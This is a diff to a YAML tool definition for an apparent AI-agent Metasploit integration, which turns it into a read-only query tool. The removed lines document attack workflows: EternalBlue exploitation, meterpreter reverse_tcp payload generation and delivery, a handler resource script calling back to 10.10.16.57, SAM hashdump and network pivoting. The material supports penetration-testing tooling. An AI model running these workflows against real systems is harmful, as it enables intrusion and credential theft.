@@ -700,21 +242,31 @@ methods:
         type: integer
         default: 0
     returns:
-      services:
+      metadata:
+        type: object
+      data:
         type: array
-        description: "Service records on this page"
-      count:
-        type: integer
-      total_items:
-        type: integer
+        description: "Service records (host, port, proto, name, state, info)"
 
-  list_creds:
-    description: "List credentials via the structured db.creds RPC. Records come back already-typed (host, origin, service, public, private, realm, private_type, JtR Format, cracked_password). Populated by post hashdump, login_check, etc."
-    when_to_use: "Query gathered credentials. After hashdump, the SAM hashes are added to creds; after smb_login auxiliary, valid creds are added."
+  msf_vulnerability_info:
+    description: "Query vulnerabilities flagged by msf modules in the workspace database. Each vuln record links a host, service, and module name."
+    when_to_use: "After running auxiliary scanners (via exploit-runner with msf in scripted mode, or having imported scan data), enumerate which CVEs are confirmed exploitable on which hosts."
     params:
+      workspace:
+        type: string
+        required: true
+        default: "default"
+        description: "Workspace name. Upstream marks this required even though it has a default — always pass 'default' unless you've explicitly created another workspace."
+      names:
+        type: array
+        description: "Array of vulnerability/module names (exact, case-sensitive match)"
       host:
         type: string
-        description: "Filter to a specific host"
+      ports:
+        type: string
+      protocol:
+        type: enum
+        values: [tcp, udp]
       limit:
         type: integer
         default: 100
@@ -722,285 +274,147 @@ methods:
         type: integer
         default: 0
     returns:
-      creds:
+      metadata:
+        type: object
+      data:
         type: array
-      count:
-        type: integer
-      total_items:
-        type: integer
 
-  list_loot:
-    description: "List loot via the structured db.loots RPC — gathered files like SAM hashes, configs, screenshots."
-    when_to_use: "After post modules that gather data (hashdump, screenshot, get_loggedon_info, etc.). loot tracks the actual file paths."
+  msf_note_info:
+    description: "Query notes attached to hosts/services in the workspace. Notes record arbitrary metadata (smb fingerprints, ssl certs, banner text, version strings)."
+    when_to_use: "Drill into details that scanners stored as notes — smb_version, ssh_version, ssl.certificate, etc. Useful when planning the exploit phase."
     params:
-      limit:
-        type: integer
-        default: 100
-      offset:
-        type: integer
-        default: 0
-    returns:
-      loot:
-        type: array
-        description: "Loot records (host, service, type, name, content, info, path)"
-      count:
-        type: integer
-      total_items:
-        type: integer
-
-  list_notes:
-    description: "List engagement notes via the structured db.notes RPC."
-    when_to_use: "Query notes added by various modules during the engagement (smb_version notes, ms17_010 vulnerable notes, etc.)."
-    params:
-      limit:
-        type: integer
-        default: 100
-      offset:
-        type: integer
-        default: 0
-    returns:
-      notes:
-        type: array
-        description: "Note records (Time, Host, Service, Port, Protocol, Type, Data)"
-      count:
-        type: integer
-      total_items:
-        type: integer
-
-  run_resource_script:
-    description: "Execute a sequence of msfconsole commands as a resource script. Maps to msfconsole `resource <file.rc>` but accepts inline content. Useful for repeatable workflows or chained commands the named methods don't cover cleanly."
-    when_to_use: "When you want to encode a multi-step workflow as a single tool call. Example: 'use exploit/...; set RHOSTS ...; set PAYLOAD ...; exploit'. For one-shot exploits prefer run_exploit; this is for atypical multi-command sequences."
-    params:
-      commands:
+      workspace:
         type: string
         required: true
-        description: "Multi-line msfconsole commands (one per line) to execute in sequence"
-      timeout:
+        default: "default"
+        description: "Workspace name. Upstream marks this required even though it has a default — always pass 'default' unless you've explicitly created another workspace."
+      type:
+        type: string
+        description: "Note type (e.g. 'smb.fingerprint', 'ssl.certificate')"
+      host:
+        type: string
+      ports:
+        type: string
+      protocol:
+        type: enum
+        values: [tcp, udp]
+      limit:
         type: integer
-        default: 600
+        default: 100
+      offset:
+        type: integer
+        default: 0
+    returns:
+      metadata:
+        type: object
+      data:
+        type: array
 
-  run_console:
-    description: "Generic msfconsole command escape hatch — execute arbitrary msfconsole input and return raw output. Use sparingly; prefer the structured named methods when they fit. Useful for niche show variants, plugin commands, debugging, or workflows that don't cleanly map to any named method. Equivalent of the 'recipe' pattern for kind:cli tools — generic surface for the niche cases."
-    when_to_use: "ONLY when no named method covers the operation. Examples: 'show advanced' for a module, plugin-specific commands, msfconsole debugging. Most workflows should use the named methods (run_exploit, session_command, post_module, etc.) which give structured returns."
+  msf_credential_info:
+    description: "Query credentials harvested into the workspace. Populated by login_check scanners, hashdump-style post modules, or db_import of credential dumps."
+    when_to_use: "After credential-gathering activity, enumerate what creds are known and which hosts they apply to. Useful for password-spray planning."
     params:
-      command:
+      workspace:
         type: string
         required: true
-        description: "msfconsole command (single line or multi-line)"
-      timeout:
+        default: "default"
+        description: "Workspace name. Upstream marks this required even though it has a default — always pass 'default' unless you've explicitly created another workspace."
+      limit:
         type: integer
-        default: 60
+        default: 100
+      offset:
+        type: integer
+        default: 0
+    returns:
+      metadata:
+        type: object
+      data:
+        type: array
 
-# ── Failure signatures ────────────────────────────────────────────────────
-# Ported from _classify_msf_error() in mcp-server.py (May 2026). The Python
-# classifier remains the runtime authority; these signatures duplicate it for
-# tool.yaml-driven plugin-side scanning (Investigation B). Substring match by
-# default. _classify_msf_error lowercases output before matching, but msf
-# typically prints in original case — keep signatures original-case here.
+  msf_loot_info:
+    description: "Query loot — files and data dumps collected into the workspace (SAM hashes, configs, screenshots, documents)."
+    when_to_use: "After post-exploitation gathered data has been written to the workspace, find the file paths to retrieve content. Loot tracks the inventory; the actual files live on disk."
+    params:
+      workspace:
+        type: string
+        required: true
+        default: "default"
+        description: "Workspace name. Upstream marks this required even though it has a default — always pass 'default' unless you've explicitly created another workspace."
+      limit:
+        type: integer
+        default: 100
+      offset:
+        type: integer
+        default: 0
+    returns:
+      metadata:
+        type: object
+      data:
+        type: array
+
+# ── Failure signatures (substring-matched against tool error/output) ──────
 failure_signatures:
-  - signal: "timed out"
-    error_class: timeout
-    remediation: "Target unreachable or link is slow. Check host with nmap; if reachable, increase the per-call timeout. Common with msfconsole running an exploit that waits for a service response."
-
-  - signal: "unreachable"
-    error_class: network_unreachable
-    remediation: "Target host or network unreachable. Check VPN (tun0 up), firewall, target alive (ping/nmap)."
-
-  - signal: "Connection refused"
-    error_class: network_unreachable
-    remediation: "Target port closed or service not running. Verify with nmap -p<port> <target>; metasploit modules typically expect specific service ports."
-
-  - signal: "ConnectionRefused"
-    error_class: network_unreachable
-    remediation: "Same as 'Connection refused' — different msf module spelling."
-
-  - signal: "Unknown datastore option"
-    error_class: invalid_parameter
-    remediation: "Module option name misspelled or doesn't exist on this module. Use search_modules to find the right module path; msfconsole's `info <module>` shows valid options. Common cause: passing 'TARGET' to an exploit that uses 'RHOSTS'."
-
-  - signal: "Module not found"
+  - signal: "rate limit exceeded"
+    error_class: rate_limited
+    remediation: "Reduce call rate. msfmcpd defaults to 60 req/min, burst 10."
+  - signal: "authentication failed"
+    error_class: auth_failed
+    remediation: "msfmcpd auto-generates random credentials each container start; auth failures suggest the embedded msfrpcd died."
+  - signal: "database is not available"
     error_class: tool_misconfigured
-    remediation: "Module path doesn't exist in this msfrpcd's module set. Use search_modules to verify the path. Common cause: typo in 'exploit/windows/...' (missing or extra slash)."
-
-  - signal: "Failed to load"
+    remediation: "Postgres is not running in the container. msf_search_modules and msf_module_info still work; the 6 DB-backed tools (host/service/vuln/note/credential/loot info) won't."
+  - signal: "metasploit api error"
     error_class: tool_misconfigured
-    remediation: "Module exists but failed to load. Could be Ruby syntax error in the module, missing dependency, or module disabled. Try `reload_all` in console; if persistent, the module is broken — file a bug or use a different module."
-
-  - signal: "Handler failed to bind"
+    remediation: "Generic msfrpcd-side failure. Check container logs (stderr)."
+  - signal: "invalid"
     error_class: invalid_parameter
-    remediation: "LPORT already in use by another handler or process on the container. Choose a different LPORT (each handler needs its own port), or stop the previous handler with `jobs -K`."
+    remediation: "Check tool arguments against the schema (workspace must be alphanumeric+underscore/hyphen, ports 1-65535, search query ≤500 chars)."
 
-  - signal: "Address is already in use"
-    error_class: invalid_parameter
-    remediation: "Same as 'Handler failed to bind' — port conflict. Use list_sessions / `jobs -l` to find what's listening; kill it or pick a different LPORT."
-
-  # session lifecycle errors — match any of: not found / dead / closed
-  - signal: "session.* not found"
-    pattern_type: regex
-    error_class: session_lost
-    remediation: "Referenced session no longer exists. Use list_sessions to enumerate active sessions. The session may have died (target crashed, network broken, target rebooted) — re-exploit if needed."
-
-  - signal: "session.* dead"
-    pattern_type: regex
-    error_class: session_lost
-    remediation: "Session marked dead by msfrpcd (target lost connection). Use list_sessions; re-exploit if you need a fresh session."
-
-  - signal: "session.* closed"
-    pattern_type: regex
-    error_class: session_lost
-    remediation: "Session closed (deliberately or due to target). Use list_sessions to confirm; re-exploit if needed."
-
-# ── Gotchas ───────────────────────────────────────────────────────────────
+# ── Gotchas — non-obvious behaviors ───────────────────────────────────────
 gotchas:
-  - "metasploit exposes EXACTLY 29 methods listed under `methods:` (plus run_cli and verify_clock auto-registered by the framework). For arbitrary msfconsole input there are TWO escape hatches: run_console (single msfconsole command, returns raw output) and run_resource_script (multi-line .rc script content). Prefer the named methods (run_exploit, post_module, route_add, portfwd_add, db_nmap, etc.) when they fit — they return structured fields the agent can branch on; fall back to run_console / run_resource_script only when no named method covers the operation."
-
-  - "Payload SHORTCUTS auto-resolve to full names: windows_reverse_tcp → windows/meterpreter/reverse_tcp, windows_reverse_https → windows/meterpreter/reverse_https, linux_reverse_tcp → linux/x64/meterpreter/reverse_tcp, linux_shell_tcp → linux/x64/shell_reverse_tcp, php_reverse → php/meterpreter/reverse_tcp, java_reverse → java/meterpreter/reverse_tcp. Pass either the shortcut or the full name."
-
-  - "PAYLOAD_FORMATS supported by generate_payload: exe, elf, raw, ruby, python, perl, php, asp, aspx, jsp, war, ps1, psh, vba, c, dll, msi. Any other value is passed through to msfvenom which may fail with 'Invalid format'."
-
-  - "First call to metasploit may take up to 120s — msfrpcd cold-start loads ~2300 modules. Subsequent calls are fast (~3s). The MCP server retries connection 30× over 60s before giving up; if the first call fails with 'connection refused' to msfrpcd, wait ~30s and retry."
-
-  - "Sessions persist in msfrpcd memory across MCP calls. session_command, list_sessions, and post_module reach the same session set. Sessions DIE if: target meterpreter process exits, network breaks, target reboots, or msfrpcd restarts. ContainerManager keeps msfrpcd warm via service:true — sessions survive between MCP calls within the same engagement."
-
-  - "MSF_PASSWORD: per-engagement randomized at container start (May 2026). Override with MSF_PASSWORD env var if you need a deterministic password (e.g., for debugging by attaching msfconsole manually). Defense-in-depth — only matters if container is exposed beyond loopback (host network mode does NOT expose 55553 by default)."
-
-  - "post_module requires SESSION param matching an existing session ID from list_sessions. Most post modules need a METERPRETER session (not a raw shell). Convert with `sessions -u <id>` via session_command, or re-exploit with a meterpreter payload."
-
-  - "handler runs as a JOB (background). The job persists in msfrpcd until manually stopped (`jobs -K`) or container restart. Multiple handlers on different LPORTs work fine; same LPORT will fail with 'Handler failed to bind'. Use exit_on_session=true if you want the handler to self-clean after first session."
-
-  - "exec_command (one-shot via exploit) is for cases where you don't need a session — useful for command-injection exploits where the goal is just to RUN something. Returns command output, no session created. Use run_exploit when you DO need a session for follow-up."
-
-  - "The shared msfconsole (_console_exec) is single-threaded. Concurrent calls get serialized. For high-throughput operations (mass payload generation, batch module loading), prefer one console invocation with multiple commands over many sequential calls."
-
-  - "Method handler() (registered as `handler`, Python method renamed from start_handler() in May 2026): accepts exit_on_session boolean. Default false = handler stays running for multiple sessions. Set true for single-shot exploitation. Pre-fix this kwarg was silently dropped — agent's intent was lost."
-
-  - "run_exploit (May 2026): success now confirmed by polling sessions.list during session_wait_seconds (default 30s) — no longer trusts the misleading 'Exploit completed, but no session was created' / 'exploit completed' phrases that msf prints before the second-stage handler binds. If the exploit window is short, raise session_wait_seconds. If you have an external handler running on the same LPORT, set disable_payload_handler=true to avoid the bind collision."
-
-  - "check_vuln (May 2026): uses `check` for exploit modules and `run` for auxiliary modules. Earlier versions sent `run` for everything which actually FIRED the exploit on exploit/* modules — verified live: ms17_010_eternalblue's check phase completed and rolled into the exploit phase, leaving Blue with a half-exploited buffer until the timeout. Always pass an exploit/* or auxiliary/* module path; module paths without that prefix default to `check`."
-
-  - "portfwd_add / portfwd_list / portfwd_delete bypass the shared msfconsole and call the meterpreter session's `run_with_output` directly. msfconsole's `sessions -i N -c \"portfwd ...\"` dispatches the command string through stdapi_sys_process_execute on Windows targets — verified live on Blue, Win7 SP1: every portfwd attempt errored with 'The system cannot find the file specified' before the fix. The direct API reaches the meterpreter built-in command parser correctly."
-
-  - "route_delete (May 2026) requires session_id in msfconsole 6.4 — `route remove <subnet> <netmask>` returns 'Missing arguments to route remove'; `route remove <subnet> <netmask> <sid>` succeeds. The keyword is `remove` (not `delete`); `delete` falls through to the usage banner with exit 0, leaving the route in place. msfconsole emits a cosmetic '[-] Invalid :session, expected Session object got Msf::Sessions::Meterpreter_x64_Win' warning during route_add/delete — the operation still succeeds; trust route_list as ground truth."
-
-  - "post_module known limitation: post modules that call create_credential — post/windows/gather/hashdump, smart_hashdump, post/multi/gather/credentials/*, mimikatz_dynwrapx — trigger an ActiveRecord 'Session can't be blank' error during DB write because the session row isn't tracked in the framework's session table when sessions are created over msfrpcd. The dump halts before hashes reach the agent. Workaround for credential extraction: call session_command(session_id, 'hashdump') — runs hashdump as a meterpreter built-in (no DB write, no AR path), returns the full SAM dump. Verified live on Blue: extracted Administrator/haris/Guest hashes cleanly. Non-credential post modules (enum_logged_on_users, enum_shares, gather/checkvm, gather/dumplinks, recon/*) work fine through post_module."
-
-  - "PostgreSQL + msfdb auto-init at container start (May 2026). Without DB the workspace methods (db_nmap, list_hosts, list_services, list_creds, list_loot, list_notes, db_import) return '[-] Database not connected'. msfrpcd reads /usr/share/metasploit-framework/config/database.yml on startup; the entrypoint also runs `msfdb init` (NOT `msfdb init --use-defaults` — Kali's msfdb is strict about exactly one positional arg and the latter falls through to usage banner with exit 0, silently failing). Each new shared console additionally issues `db_connect -y <yaml>` defensively in case the daemon-side connection drops."
-
-  - "Server-side concurrency: `_op_lock` (asyncio.Lock) serializes ALL operations that touch shared state — the msfconsole pipeline AND meterpreter session calls. Without it, two concurrent tools/call requests on the same shared console interleave their write/read cycles (the first reader drains output for everyone), and concurrent meterpreter run_with_output on the same session triggers KeyError 'data' from pymetasploit3. Verified live: list_hosts/list_services/list_creds issued as a 3-call batch all returned through list_hosts pre-fix; portfwd_* batched with session_command on session 1 all errored 'data' pre-fix. With the lock, the same batches return distinct correct outputs."
+  - "READ-ONLY: this tool cannot run an exploit, fire a scanner, generate a payload, or talk to a session. For execution → exploit-runner with the public PoC script for the CVE. Upstream (Rapid7) plans to add execution tools later — they will appear here automatically when they ship."
+  - "Module path conventions differ between methods: msf_search_modules returns 'fullname' INCLUDING the type prefix (e.g. 'exploit/windows/smb/ms17_010_eternalblue'). msf_module_info wants 'type' + 'name' SEPARATELY (type='exploit', name='windows/smb/ms17_010_eternalblue'). Strip the leading 'exploit/' when calling module_info."
+  - "Workspace database empty by default — msf only knows about hosts that this MCP's underlying msfrpcd has seen (via db_nmap/db_import or successful module runs). Other tools' findings (nmap MCP results) do NOT auto-populate this DB. To use msf_host_info / msf_service_info productively, route nmap results through msf via db_import."
+  - "DB-backed tools (host, service, vulnerability, note, credential, loot) require Postgres to be running inside the container. The entrypoint initializes it but if init fails (e.g. on resource-constrained hosts), those 6 tools will return 'database is not available'. msf_search_modules and msf_module_info don't touch the DB and still work."
+  - "msfmcpd auto-spawns msfrpcd internally with random credentials each container start. Sessions / state from a prior container do NOT persist — every per-engagement spin-up gets a clean DB."
+  - "Cold-start cost: ~30s on first call (Postgres start + msfdb init + workspace bootstrap + msfmcpd-spawned msfrpcd loading ~2,300 modules). Subsequent calls within ContainerManager's idle window (default 5min, this tool's set to 10min) are <1s."
+  - "Pagination defaults limit=100 max=1000. For exhaustive enumeration of hosts/services on a large workspace, page through with offset increments."
+  - "Rate limit: 60 requests/minute with burst of 10. Hammering more than 10 tool calls in quick succession will fail the 11th+ with a rate-limit error until the token bucket refills. Pace tight loops with ≥1s gaps, or cluster heavy enumeration calls and wait between bursts."
+  - "5 of 6 DB-backed tools mark `workspace` as REQUIRED in their JSON-Schema even though the param has a default value of 'default' (upstream inconsistency — only msf_host_info treats it as truly optional). Always pass `workspace: \"default\"` explicitly to msf_service_info / msf_vulnerability_info / msf_note_info / msf_credential_info / msf_loot_info, or you'll get '-32602 Missing required arguments: workspace'."
+  - "The auto-spawned msfrpcd creates DB schema but NOT any workspaces. The container's entrypoint pre-creates the 'default' workspace via `msfconsole -x 'workspace -a default; exit'` so DB tools work out of the box. If you ever see 'Invalid workspace', either the bootstrap failed or you passed a name that wasn't created — fall back to a manual `workspace -a <name>` from msfconsole."
 
 # ── Usage patterns ────────────────────────────────────────────────────────
 usage_patterns:
-  - name: "Search for an exploit by CVE"
-    method: "search_modules"
-    args: {query: "ms17-010", type: "exploit"}
-    when: "Find Metasploit modules matching a CVE, software, or service. Returns parsed list with module path, type, and one-line info. Use this BEFORE check_vuln or run_exploit to confirm the right module path."
-
-  - name: "Confirm target is vulnerable before exploiting"
-    method: "check_vuln"
-    args: {module: "auxiliary/scanner/smb/smb_ms17_010", rhosts: "{TARGET}"}
-    when: "Run a scanner module to verify vulnerability without launching the actual exploit. Auxiliary scanners typically don't trigger AV/IDS the way exploits do. Returns 'Host is likely VULNERABLE' / 'NOT VULNERABLE' / 'CHECK_FAILED'."
-
-  - name: "Generate a Windows meterpreter payload (.exe)"
-    method: "generate_payload"
-    args: {payload: "windows_reverse_tcp", lhost: "{LHOST}", lport: 4444, format: "exe"}
-    when: "Generate a Windows .exe meterpreter for delivery (USB drop, RCE upload, file-write injection). Returns base64-encoded binary. Decode and write to /session/payload.exe; transfer to target via your delivery primitive (curl-upload, smbclient put, xp_cmdshell, etc.)."
-
-  - name: "Start a listener for the payload"
-    method: "handler"
-    args: {payload: "windows_reverse_tcp", lhost: "{LHOST}", lport: 4444, exit_on_session: false}
-    when: "Always START the handler BEFORE delivering the payload — otherwise callback fails with no listener. Use exit_on_session=false for multi-session campaigns; true for single-shot. Handler runs as a msfrpcd background job; persists across MCP calls."
-
-  - name: "Run an exploit against a confirmed-vulnerable target"
-    method: "run_exploit"
-    args: {module: "exploit/windows/smb/ms17_010_eternalblue", rhosts: "{TARGET}", payload: "windows/x64/meterpreter/reverse_tcp", lhost: "{LHOST}", lport: 4444}
-    when: "Execute an exploit module. If successful, creates a session that persists in msfrpcd. Use after check_vuln confirms vulnerability (don't burn the exploit on a non-vulnerable target). Returns session_id on success — capture it for follow-up session_command / post_module calls."
-
-  - name: "List active sessions"
-    method: "list_sessions"
-    args: {}
-    when: "Enumerate meterpreter / shell sessions in msfrpcd memory. Use after run_exploit to confirm session creation, and periodically during long engagements to detect dropped sessions."
-
-  - name: "Run a command in an established session"
-    method: "session_command"
-    args: {session_id: 1, command: "getuid"}
-    when: "Interact with an existing session (meterpreter or shell). For meterpreter, common commands: sysinfo, getuid, getsystem, ipconfig, hashdump, ps, getpid, migrate <pid>. For raw shells: just the OS command (whoami, ipconfig /all, etc.)."
-
-  - name: "One-shot command via exploit (no session)"
-    method: "exec_command"
-    args: {module: "exploit/multi/handler", payload: "cmd/unix/reverse_bash", lhost: "{LHOST}", lport: 4445, command: "id; uname -a"}
-    when: "Use for command-injection exploits where you just need to RUN something and get output, no session needed. Faster than run_exploit + session_command sequence; less stealth than a proper session."
-
-  - name: "Run a post-exploitation module on a session"
-    method: "post_module"
-    args: {module: "post/windows/gather/enum_logged_on_users", session_id: 1}
-    when: "Run a Metasploit post module against an existing meterpreter session (raw shells often won't work — convert via session_upgrade). Common picks: post/windows/gather/enum_logged_on_users (recent profiles + currently-logged-in SIDs), post/multi/recon/local_exploit_suggester (kernel-exploit candidates), post/windows/manage/migrate (move to a stable process). For credential extraction (hashdump / smart_hashdump) use session_command(session_id, 'hashdump') instead — see the post_module gotcha for the AR/DB limitation."
-
-  - name: "Dump SAM hashes (workaround for post_module credential AR limitation)"
-    method: "session_command"
-    args: {session_id: 1, command: "hashdump"}
-    when: "post_module post/windows/gather/hashdump trips an ActiveRecord 'Session can't be blank' error during DB write and never returns the hashes to the agent (verified live on Blue, Win7 SP1). meterpreter has hashdump as a built-in command that bypasses the post-module DB path entirely — use session_command for SAM dumping. The output format matches mimikatz: 'user:rid:lm-hash:nt-hash:::'."
-
-  - name: "Pivot through a compromised host into an internal subnet"
-    method: "route_add"
-    args: {subnet: "10.10.20.0", netmask: "255.255.255.0", session_id: 1}
-    when: "After establishing meterpreter on a host that bridges into an internal network. Subsequent metasploit modules targeting IPs in 10.10.20.0/24 will route through session 1. Pair with portfwd_add when you want non-msf tools (impacket, hydra, custom scripts) to reach those internal hosts via localhost:<local_port>."
-
-  # ─────────── Extension mechanism via run_console / run_resource_script ───────────
-  # Concrete patterns showing how to reach msfconsole functionality NOT exposed
-  # as a named method. These two escape hatches ARE the recipe/extension system —
-  # anything msfconsole can interpret can be sent through them.
-
-  - name: "Manage workspaces (multi-engagement isolation)"
-    method: "run_console"
-    args: {command: "workspace -a corp_engagement"}
-    when: "Create or switch metasploit workspaces. Default workspace is shared; for multi-target engagements use `workspace -a <name>` to add, `workspace <name>` to switch, `workspace -l` to list, `workspace -d <name>` to delete. All db_nmap / list_hosts / list_creds / etc. operate on the current workspace."
-
-  - name: "Add a credential discovered outside metasploit"
-    method: "run_console"
-    args: {command: "creds add user:admin password:'P@ssw0rd!' host:10.10.10.40 port:445 service_name:smb realm:CORP"}
-    when: "When responder catches an NTLM hash, hydra cracks a password, or you find creds in a config file — inject them into the workspace creds table so subsequent metasploit modules (psexec, smb_login, etc.) can use them. list_creds will then show the entry."
-
-  - name: "Set a global option (saves typing across many module invocations)"
-    method: "run_console"
-    args: {command: "setg LHOST 10.10.16.57"}
-    when: "Most modules need LHOST/LPORT/RHOSTS. setg makes the value sticky across `use module` calls. Pair with `save` to persist across msfrpcd restarts. Use `unsetg <var>` to clear."
-
-  - name: "Query workspace state msfconsole exposes but no named method covers"
-    method: "run_console"
-    args: {command: "vulns"}
-    when: "vulns lists discovered vulnerabilities (populated by some auxiliary scanners). Same pattern for `analyze` (correlates hosts/services/creds), `loot -d <id>` (delete a loot entry), `hosts -d <ip>` (delete a host)."
-
-  - name: "Load and use an msfconsole plugin"
-    method: "run_console"
-    args: {command: "load wmap"}
-    when: "msfconsole has plugins (wmap for web app fuzzing, nessus/openvas integrations, sounds, etc.). After load, the plugin's commands become available — use run_console for each. `plugins` lists loaded; `unload <plugin>` removes."
-
-  - name: "Multi-step recipe via inline resource script"
-    method: "run_resource_script"
+  - name: "CVE → module mapping"
+    description: "Find which Metasploit modules cover a known CVE."
+    method: msf_search_modules
     args:
-      commands: |
-        use exploit/multi/handler
-        set PAYLOAD windows/x64/meterpreter/reverse_tcp
-        set LHOST 10.10.16.57
-        set LPORT 4444
-        set ExitOnSession false
-        exploit -j
-        use post/windows/manage/migrate
-        set SESSION 1
-        set NAME explorer.exe
-        run
-    when: "When a workflow needs MULTIPLE msfconsole commands chained (handler setup + module configuration + execution + post-exploit). run_resource_script accepts inline content — no need to write a .rc file. For one-shot single commands prefer run_console."
+      query: "CVE-2017-0144"
+      limit: 20
 
-  - name: "Run any niche msfconsole command (the safety hatch)"
-    method: "run_console"
-    args: {command: "show advanced"}
-    when: "When no named method covers the operation — `show <category>` (exploits/payloads/encoders/nops/auxiliary/post/evasion), `route flush`, `portfwd flush`, `route get <ip>`, `version`, `banner`, `spool <file>` (capture output to file), `makerc <file>` (record session into rc), `irb`-pry-style debugging IS NOT supported here. Anything msfconsole interprets as a single command works."
+  - name: "Search by service + advisory"
+    description: "Find SMB-related auxiliary modules for MS17-010 detection."
+    method: msf_search_modules
+    args:
+      query: "type:auxiliary smb ms17_010"
 
-# ── Help commands ─────────────────────────────────────────────────────────
-help_commands:
-  - command: "msfconsole --version"
-    purpose: "Verify Metasploit version + ensure metasploit-framework is installed"
-  - command: "msfvenom --list payloads | head -20"
-    purpose: "Sample of available payloads (full list is ~600)"
-  - command: "msfvenom --list formats"
-    purpose: "All supported output formats for generate_payload"
+  - name: "Module options before scripting"
+    description: "Look up RHOSTS/LHOST/payload/target options for an exploit module before writing the PoC script for exploit-runner."
+    method: msf_module_info
+    args:
+      type: "exploit"
+      name: "windows/smb/ms17_010_eternalblue"
+
+  - name: "Workspace host inventory"
+    description: "After db_import or db_nmap (run via exploit-runner), enumerate discovered hosts."
+    method: msf_host_info
+    args:
+      only_up: true
+      limit: 100
+
+  - name: "Service inventory by port range"
+    description: "What's listening on the upper port range across the workspace?"
+    method: msf_service_info
+    args:
+      ports: "1024-65535"
+      protocol: "tcp"
